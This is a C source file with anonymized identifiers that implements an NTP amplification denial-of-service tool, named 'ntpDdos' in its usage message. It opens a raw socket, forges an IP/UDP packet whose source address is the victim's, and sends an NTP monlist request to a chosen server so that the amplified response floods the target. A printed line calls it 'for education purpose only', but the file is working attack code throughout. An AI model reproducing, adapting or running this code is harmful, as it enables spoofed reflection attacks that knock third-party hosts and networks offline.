
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct udpheader {scalar_t__ udp_checksum; void* udp_length; void* udp_destinationPortNumber; void* udp_sourcePortNumber; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct ntpreqheader {int rm_vn_mode; int implementation; int request; } ;
struct iphdr {int version; int ihl; int tot_len; int ttl; scalar_t__ check; void* daddr; void* saddr; int protocol; scalar_t__ frag_off; void* id; scalar_t__ tos; } ;
typedef int packet ;
typedef int dest ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (char*) ;
 scalar_t__ FUNC_1 (unsigned short*,int) ;
 int FUNC_2 (int) ;
 void* FUNC_3 (int) ;
 void* FUNC_4 (char*) ;
 int FUNC_5 (char*,int ,int) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_8 (int,int ,int ,int*,int) ;
 int FUNC_9 (int ,int ,int ) ;

int FUNC_10(int VAR_6, char **VAR_7)
{
int VAR_8;
struct iphdr *VAR_9;
struct udpheader *VAR_10;
struct ntpreqheader *VAR_11;
int VAR_12;
int VAR_13 = 1;
struct sockaddr_in VAR_14;
char VAR_15[ sizeof(struct iphdr) + sizeof(struct udpheader) + sizeof(struct ntpreqheader) ];


 if( VAR_6 != 3){
  FUNC_6("Usage: ./ntpDdos [Target IP] [NTP Server IP]\n");
  FUNC_6("Example: ./ntpDdos 1.2.3.4 127.0.0.1 \n");
  FUNC_6("Watch it on wireshark!\n");
  FUNC_6("Coded for education purpose only!\n");
  FUNC_2(1);
 }


 VAR_12 = FUNC_9(VAR_4, VAR_5, VAR_2);
 if (VAR_12 == -1){
  FUNC_6("Error on initializing the socket\n");
  FUNC_2(1);
 }




 VAR_8 = FUNC_8( VAR_12, VAR_1, VAR_3, &VAR_13, sizeof VAR_13);
 if (VAR_8 == -1){
                FUNC_6("Error on setting the option HDRINCL on socket\n");
                FUNC_2(1);
        }



 FUNC_5( VAR_15, 0, sizeof(VAR_15) );




 VAR_9 = (struct iphdr *)VAR_15;
 VAR_10 = (struct udpheader *) (VAR_15 + sizeof(struct iphdr) );
 VAR_11 = (struct ntpreqheader *) (VAR_15 + sizeof(struct iphdr) + sizeof(struct udpheader) );



 VAR_9->version = 4;
        VAR_9->ihl = 5;
        VAR_9->tos = 0;
        VAR_9->tot_len = sizeof(VAR_15);
        VAR_9->id = FUNC_3(1234);
        VAR_9->frag_off = 0;
        VAR_9->ttl = 255;
        VAR_9->protocol = VAR_2;
        VAR_9->check = 0;
        VAR_9->saddr = FUNC_4( VAR_7[1] );
        VAR_9->daddr = FUNC_4( VAR_7[2] );


 VAR_10->udp_sourcePortNumber = FUNC_3( FUNC_0( "123" ) );
 VAR_10->udp_destinationPortNumber = FUNC_3(FUNC_0("123")) ;
 VAR_10->udp_length = FUNC_3( sizeof(struct udpheader) + sizeof(struct ntpreqheader) );
 VAR_10->udp_checksum = 0;


 VAR_9->check = FUNC_1((unsigned short *)VAR_15, VAR_9->tot_len);


 VAR_14.sin_family = VAR_0;
 VAR_14.sin_port = FUNC_3 (FUNC_0( "123" ) ) ;
 VAR_14.sin_addr.s_addr = FUNC_4( VAR_7[2] );






 VAR_11->rm_vn_mode=0x17;
 VAR_11->implementation=0x03;
 VAR_11->request=0x2a;




 VAR_8 = FUNC_7(VAR_12, VAR_15, VAR_9->tot_len, 0, (struct sockaddr *)&VAR_14, sizeof(VAR_14) );
  if(VAR_8 <0){
   FUNC_6("Failed to send the packets\n");
   FUNC_2(1);
  }


}
